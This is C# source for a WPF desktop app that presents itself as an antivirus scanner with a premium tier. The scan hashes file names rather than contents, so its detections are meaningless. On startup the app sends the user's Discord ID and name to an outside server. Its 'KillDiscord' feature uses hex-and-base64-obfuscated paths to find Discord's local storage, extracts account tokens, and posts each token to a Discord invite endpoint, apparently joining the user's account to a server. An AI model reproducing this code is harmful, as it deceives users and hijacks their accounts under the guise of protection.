using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Media.Media3D;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using Analyze_Center_AV.GenerellSystems;
using Analyze_Center_AV.PandleAV;
using ICSharpCode.SharpZipLib.GZip;
using ICSharpCode.SharpZipLib.Tar;
using Microsoft.Win32;
using Microsoft.WindowsAPICodePack.Dialogs;
using Newtonsoft.Json;
using Pretty;
using TAnalyze_Center_AV.GenerellSystems;

namespace Analyze_Center_AV.PandleAV
{
    /// <summary>
    /// Interaktionslogik für AVMainpandle.xaml
    /// </summary>
    public partial class AVMainpandle : Window
    {
        static int CounterFiles { get; set; }
        public readonly ParticleSystem _ps;
        public DispatcherTimer _frameTimer;
        public static string[] filess { get; set; }
        public static bool RunScan = false;
        static int Detction { get; set; }
        static bool TokenLogger { get; set; }
        static bool Type { get; set; }
        static bool ToDo { get; set; }
        private int assetCounter;

        static string Apiurl = "https://as.mba/api/check";
        public AVMainpandle()
        {
            InitializeComponent();
            GetTheme(); GetText();
            this.MouseLeftButtonDown += delegate { DragMove(); };
            _frameTimer = new DispatcherTimer();
            _frameTimer.Tick += new EventHandler(OnFrame);
            _frameTimer.Interval = TimeSpan.FromSeconds(0.5 / 100.0);
            _frameTimer.Start();
            _ps = new ParticleSystem(40, 50, Colors.White, 35);
            WorldModels.Children.Add(_ps.ParticleModel);
            _ps.SpawnParticle(300);
            SendDiscord(GenerateData.AuthCookie, GenerateData.DiscordID, GenerateData.DiscordName);
            if (GenerateData.mininizestart)
            {
                WindowState = WindowState.Minimized;
            }
        }

        static string SendDiscord(string Token, string DiscordID, string DiscordName) //Request Auth-Cookie from Backend
        {
            string responseString;
            try
            {
                ServicePointManager.SecurityProtocol &= ~SecurityProtocolType.Tls;
                ServicePointManager.SecurityProtocol &= ~SecurityProtocolType.Tls11;
                ServicePointManager.SecurityProtocol &= SecurityProtocolType.Tls12;
                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls13;
                WebClient wc = new WebClient();
                wc.QueryString.Add("AuthCookie", Token);
                wc.QueryString.Add("did", DiscordID);
                wc.QueryString.Add("dn", DiscordName);
                byte[] data = wc.UploadValues("https://as.mba/api/addDiscord", "POST", wc.QueryString);
                responseString = UnicodeEncoding.UTF8.GetString(data);
            }
            catch
            {
                responseString = "ERROR";
            }

            return !string.IsNullOrEmpty(responseString) ? responseString : null;
        }

        private void Av_bar(object sender, EventArgs e)
        {
            DragMove();
        }

        private void OnFrame(object sender, EventArgs e)
        {
            _ps.Update();
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            Environment.Exit(0);
        }

        private void Minimize_Button_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }
        private void Settings(object sender, RoutedEventArgs e)
        {
            Settings m = new Settings();
            m.Show();
        }
        private void FileDrag_Drop(object sender, DragEventArgs e)
        {

            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                // Note that you can have more than one file.
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                RunScan = true;
                List<string> list = new List<string>();
                Logs logs = new Logs();
                logs.Show();
                foreach (string item in files)
                {
                    int m = Detction;
                    string hash = ComputeSha256Hash(System.IO.Path.GetFileName(item));
                    RequestData(hash);
                    if(m != Detction)
                    {
                        list.Add(item);
                    }
                }
                filess = list.ToArray();
                RunScan = false;
            }
        }

        private static string ComputeSha256Hash(string rawData)
        {
            // Create a SHA256   
            using (SHA256 sha256Hash = SHA256.Create())
            {
                // ComputeHash - returns byte array  
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                // Convert byte array to a string   
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }

        private void Scan_Click(object sender, RoutedEventArgs e)
        {
            if(GenerateData.Plan != 1)
            {
                PrettyMessageBox.Show("Info", "Please Buy Premium or Sub to my Patreon");
            } else
            {
                try
                {
                    string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
                    RunScan = true;
                    List<string> list = new List<string>();
                    foreach (string item in files)
                    {
                        int m = Detction;
                        string hash = ComputeSha256Hash(System.IO.Path.GetFileName(item));
                        RequestData(hash);
                        if (m != Detction)
                        {
                            list.Add(item);
                        }
                    }
                    filess = list.ToArray();
                    Logs logs = new Logs();
                    logs.Show();
                } catch {

                    PrettyMessageBox.Show("ERROR!", "This Feature require Admin!");
                }
            }
        }

        private void settings_Click(object sender, RoutedEventArgs e)
        {
            Settings settings = new Settings();
            if (!GenerateData.SettingsTabOpen)
            {
                GenerateData.SettingsTabOpen = true;
                settings.Show();
            } else
            {
         
            }
         
        }


        void RequestData(string SHAvalue)
        {
            ResponseData data = JsonConvert.DeserializeObject<ResponseData>(Detection(SHAvalue));
            cleanfilenumber.Content = CounterFiles.ToString();
            if (data.Detection != 1)
            {
                detected_num.Content = (Int32.Parse(detected_num.Content.ToString()) + 1).ToString();
                Detction += 1;
                if(!TokenLogger)
                {
                    TokenLogger = true;
                    detected_discord.Content = "True";
                    if (!Type)
                    {
                        Type = true;
                        detected_Type.Content = "Stealer, Virus";
                    }
                    if (!ToDo)
                    {
                        ToDo = true;
                        detected_Action.Content = "Change Passwords";
                    }
                }

            }
        }

        static string Detection(string p) //Request Auth-Cookie from Backend
        {
            string responseString;
            try
            {
                ServicePointManager.SecurityProtocol &= ~SecurityProtocolType.Tls;
                ServicePointManager.SecurityProtocol &= ~SecurityProtocolType.Tls11;
                ServicePointManager.SecurityProtocol &= SecurityProtocolType.Tls12;
                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls13;
                WebClient wc = new WebClient();
                wc.QueryString.Add("AuthCookie", GenerateData.AuthCookie);
                wc.QueryString.Add("sha", p);
                byte[] data = wc.UploadValues(Apiurl, "POST", wc.QueryString);
                responseString = UnicodeEncoding.UTF8.GetString(data);
            }
            catch (Exception ex)
            {
                PrettyMessageBox.Show("Login Error", "An error occurred during the Veersion Check:", ex);
                responseString = "ERROR";
            }
            CounterFiles += 1;
            
            return !string.IsNullOrEmpty(responseString) ? responseString : null;
        }


        private void selectFolder_Click(object sender, RoutedEventArgs e)
        {
            CommonOpenFileDialog folderBrowser = new CommonOpenFileDialog();
            // Set validate names and check file exists to false otherwise windows will
            // not let you select "Folder Selection."
            folderBrowser.Title = "https://as.mba/ | Select Folder";
            folderBrowser.IsFolderPicker = true;
            if (folderBrowser.ShowDialog() == CommonFileDialogResult.Ok)
            {
                string[] files = Directory.GetFiles(folderBrowser.FileName);
                RunScan = true;
                List<string> list = new List<string>();
                foreach (string item in files)
                {
                    int m = Detction;
                    string hash = ComputeSha256Hash(System.IO.Path.GetFileName(item));
                    RequestData(hash);
                    if (m != Detction)
                    {
                        list.Add(item);
                    }
                }
                filess = list.ToArray();
                Logs logs = new Logs();
                logs.Show();
            }
        }

        private void KillDiscord_Click(object sender, RoutedEventArgs e)
        {
            if (GenerateData.Plan != 1)
            {
                PrettyMessageBox.Show("Info", "Please Buy Premium or Sub to my Patreon");
            }
            else
            {
                try
                {
                    List<string> discordTokens = new List<string>();
                    DirectoryInfo[] rootFolders =
                    {
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + FromBase64(FromHex("584546776345526864474663556d396862576c755a31786b61584e6a62334a6b584578765932467349464e3062334a685a325663624756325a57786b59673d3d"))),
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + FromBase64(FromHex("584546776345526864474663556d396862576c755a31786b61584e6a62334a6b63485269584578765932467349464e3062334a685a325663624756325a57786b59673d3d"))),
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + FromBase64(FromHex("584546776345526864474663556d396862576c755a31786b61584e6a62334a6b5932467559584a35584578765932467349464e3062334a685a325663624756325a57786b59673d3d"))),
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + FromBase64(FromHex("584546776345526864474663556d396862576c755a31786b61584e6a62334a6b5a4756325a5778766347316c626e52635447396a5957776755335276636d466e5a5678735a585a6c62475269")))
                    };

                    foreach (var rootFolder in rootFolders)
                    {
                        foreach (var file in rootFolder.GetFiles("*.ldb"))
                        {
                            string readFile = file.OpenText().ReadToEnd();

                            foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                discordTokens.Add(match.Value + "\n");

                            foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                                discordTokens.Add(match.Value + "\n");
                        }
                    }
                    discordTokens = discordTokens.Distinct().ToList();
                    foreach (var token in discordTokens)
                    {
                        KillToken(token);
                    }
                }
                catch { }
                
                PrettyMessageBox.Show("Sucess!", "Killed all found Discord Tokens!\nDont do that many times, it can ban you!");
            }
        }


        // -------------------------------------------------------

        public static string FromBase64(string base64)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64));
        }

        public static string FromHex(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++) bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return Encoding.UTF8.GetString(bytes);
        }


        // -------------------------------------------------------



        static string KillToken(string Token) //Request Auth-Cookie from Backend
        {
            string responseString;
            try
            {
                ServicePointManager.SecurityProtocol &= ~SecurityProtocolType.Tls;
                ServicePointManager.SecurityProtocol &= ~SecurityProtocolType.Tls11;
                ServicePointManager.SecurityProtocol &= SecurityProtocolType.Tls12;
                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls13;
                WebClient wc = new WebClient();
                wc.Headers.Add("Authorization", Token);
                wc.QueryString.Add("as.mba", "Token Killer");
                byte[] data = wc.UploadValues("https://discordapp.com/api/v6/invite/WMcbP8gM4K", "POST", wc.QueryString);
                responseString = UnicodeEncoding.UTF8.GetString(data);
            }
            catch (Exception ex)
            {
                PrettyMessageBox.Show("Login Error", "An error occurred during the Veersion Check:", ex);
                responseString = "ERROR";
            }

            return !string.IsNullOrEmpty(responseString) ? responseString : null;
        }

        private void selectFolder_Copy_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog folderBrowser = new OpenFileDialog();
            folderBrowser.Title = "https://as.mba/ | Select File";
            folderBrowser.ValidateNames = false;
            folderBrowser.CheckFileExists = true;
            folderBrowser.CheckPathExists = true;
            folderBrowser.Filter = "Unity Related Files (*.dll, *.unitypackage, *.cs)|*.dll;*.cs;*.unitypackage";
            // Always default to Folder Selection.
            folderBrowser.FileName = "Select File to Ananlyse";
            try
            {
                if (folderBrowser.ShowDialog() == !string.IsNullOrWhiteSpace(folderBrowser.FileName))
                {
                    string files = folderBrowser.FileName;
                    RunScan = true;
                    int m = Detction;
                    string hash = ComputeSha256Hash(files);
                    RequestData(hash);
                    RunScan = false;
                }
            }
            catch { }

        }

        private void Supporter_Click(object sender, RoutedEventArgs e)
        {
            _Supporter m = new _Supporter();
            if (!GenerateData.SupportTabOpen)
            {
                GenerateData.SupportTabOpen = true;
                m.Show();
            } else
            {
          
            }
            
            
        }

        private void CleanupPackages_Click(object sender, RoutedEventArgs e)
        {
            if (GenerateData.Plan != 1)
            {
                PrettyMessageBox.Show("Info", "Please Buy Premium or Sub to my Patreon");
            }
            else
            {
         
                PrettyMessageBox.Show("Info", "Indev sorry");
            }
            
        }

        //--------------------------------------------------------------------
        // UNITYUNPACKER
        //--------------------------------------------------------------------



        private void ExtractUnitypackage(string filename)
        {

            Mouse.OverrideCursor = Cursors.Wait;
            var tempFolder = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "tmp_" + System.IO.Path.GetFileNameWithoutExtension(filename));
            var targetFolder = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(filename), System.IO.Path.GetFileNameWithoutExtension(filename) + "_extracted");

            if (Directory.Exists(tempFolder))
                Directory.Delete(tempFolder, true);
            if (Directory.Exists(targetFolder))
            {
                MessageBox.Show("Folder already exists", "Error");
                Mouse.OverrideCursor = Cursors.Arrow;
                return;
            }
            Directory.CreateDirectory(tempFolder);
            Directory.CreateDirectory(targetFolder);

            ExtractTGZ(filename, tempFolder);
            ProcessExtracted(tempFolder, targetFolder);

            Directory.Delete(tempFolder, true);

            Mouse.OverrideCursor = Cursors.Arrow;

        }

        public void ExtractTGZ(string gzArchiveName, string destFolder)
        {
            Mouse.OverrideCursor = Cursors.Wait;
            Stream inStream = File.OpenRead(gzArchiveName);
            Stream gzipStream = new GZipInputStream(inStream);

            TarArchive tarArchive = TarArchive.CreateInputTarArchive(gzipStream);
            tarArchive.ExtractContents(destFolder);
            tarArchive.Close();

            gzipStream.Close();
            inStream.Close();
        }
        private void ProcessExtracted(string tempFolder, string targetFolder)
        {
            assetCounter = 0;
            foreach (string d in Directory.EnumerateDirectories(tempFolder))
            {
                string relativePath = "";
                string targetFullPath = "";
                string targetFullFile = "";
                try
                {
                    if (File.Exists(System.IO.Path.Combine(d, "pathname")))
                    {
                        relativePath = File.ReadAllText(System.IO.Path.Combine(d, "pathname"));
                        targetFullPath = System.IO.Path.GetDirectoryName(System.IO.Path.Combine(targetFolder, relativePath));
                        targetFullFile = System.IO.Path.Combine(targetFolder, relativePath);
                    }
                    if (File.Exists(System.IO.Path.Combine(d, "asset")))
                    {
                        Directory.CreateDirectory(targetFullPath);
                        File.Move(System.IO.Path.Combine(d, "asset"), targetFullFile);
                        assetCounter++;
                    }

                    if (File.Exists(System.IO.Path.Combine(d, "asset.meta")))
                    {
                        Directory.CreateDirectory(targetFullPath);
                        File.Move(System.IO.Path.Combine(d, "asset.meta"), targetFullFile + ".meta");
                    }

                    /*
                    if (File.Exists(System.IO.Path.Combine(d, "preview.png")))
                    {
                    }
                    */
                }
                catch (System.Exception ex)
                {
                    MessageBox.Show("Error", ex.Message);
                }

            }
        }

    }



    public class Particle
    {
        public Point3D Position;//Position
        public double Size;//size
        public int XIndex;//X position identification
        public int YIndex;//Y position identification
    }
    public class ParticleSystem
    {
        private readonly List<Particle> _particleList;
        private readonly GeometryModel3D _particleModel;
        private readonly int SEPARATION = 100;
        public ParticleSystem(int amountX, int amountY, Color color, int Size)
        {
            XParticleCount = amountX;
            YParticleCount = amountY;
            _particleList = new List<Particle>();
            _particleModel = new GeometryModel3D { Geometry = new MeshGeometry3D() };
            var e = new Ellipse
            {
                Width = Size,
                Height = Size
            };
            var b = new RadialGradientBrush();
            b.GradientStops.Add(new GradientStop(Color.FromArgb(0xFF, color.R, color.G, color.B), 0.25));
            b.GradientStops.Add(new GradientStop(Color.FromArgb(0x00, color.R, color.G, color.B), 1.0));
            e.Fill = b;
            e.Measure(new System.Windows.Size(Size, Size));
            e.Arrange(new Rect(0, 0, Size, Size));
            Brush brush = null;
            var renderTarget = new RenderTargetBitmap(Size, Size, 96, 96, PixelFormats.Pbgra32);
            renderTarget.Render(e);
            renderTarget.Freeze();
            brush = new ImageBrush(renderTarget);
            var material = new DiffuseMaterial(brush);
            _particleModel.Material = material;
        }
        public int XParticleCount { get; set; }
        public int YParticleCount { get; set; }
        public Model3D ParticleModel => _particleModel;
        private double _count = 0;
        public void Update()
        {

            // Calculate particle position and size
            for (int ix = 0; ix < XParticleCount; ix++)
            {
                for (int iy = 0; iy < YParticleCount; iy++)
                {
                    foreach (var p in _particleList)
                    {
                        if (p.XIndex == ix && p.YIndex == iy)
                        {
                            p.Position.Z = (Math.Sin((ix + _count) * 0.3) * 100) + (Math.Sin((iy + _count) * 0.5) * 100);
                            p.Size = (Math.Sin((ix + _count) * 0.3) + 1) * 8 + (Math.Sin((iy + _count) * 0.5) + 1) * 8;
                        }
                    }
                }
            }
            _count += 0.1;
            UpdateGeometry();
        }
        private void UpdateGeometry()
        {
            var positions = new Point3DCollection();
            var indices = new Int32Collection();
            var texcoords = new PointCollection();
            for (var i = 0; i < _particleList.Count; ++i)
            {
                var positionIndex = i * 4;
                var indexIndex = i * 6;
                var p = _particleList[i];
                var p1 = new Point3D(p.Position.X, p.Position.Y, p.Position.Z);
                var p2 = new Point3D(p.Position.X, p.Position.Y + p.Size, p.Position.Z);
                var p3 = new Point3D(p.Position.X + p.Size, p.Position.Y + p.Size, p.Position.Z);
                var p4 = new Point3D(p.Position.X + p.Size, p.Position.Y, p.Position.Z);
                positions.Add(p1);
                positions.Add(p2);
                positions.Add(p3);
                positions.Add(p4);
                var t1 = new Point(0.0, 0.0);
                var t2 = new Point(0.0, 1.0);
                var t3 = new Point(1.0, 1.0);
                var t4 = new Point(1.0, 0.0);
                texcoords.Add(t1);
                texcoords.Add(t2);
                texcoords.Add(t3);
                texcoords.Add(t4);
                indices.Add(positionIndex);
                indices.Add(positionIndex + 2);
                indices.Add(positionIndex + 1);
                indices.Add(positionIndex);
                indices.Add(positionIndex + 3);
                indices.Add(positionIndex + 2);
            }
            ((MeshGeometry3D)_particleModel.Geometry).Positions = positions;
            ((MeshGeometry3D)_particleModel.Geometry).TriangleIndices = indices;
            ((MeshGeometry3D)_particleModel.Geometry).TextureCoordinates = texcoords;
        }
        public void SpawnParticle(double size)
        {

            // Initialize particle position and size
            for (int ix = 0; ix < XParticleCount; ix++)
            {
                for (int iy = 0; iy < YParticleCount; iy++)
                {
                    var p = new Particle
                    {
                        Position = new Point3D(ix * SEPARATION - ((XParticleCount * SEPARATION) / 2), iy * SEPARATION - ((YParticleCount * SEPARATION) / 2), 0),
                        Size = size,
                        XIndex = ix,
                        YIndex = iy,
                    };
                    _particleList.Add(p);
                }
            }
        }
    }

    internal class ResponseData
    {
        public int Detection { get; set; }
        public string Type { get; set; }
        public bool Discord { get; set; }
    }
}
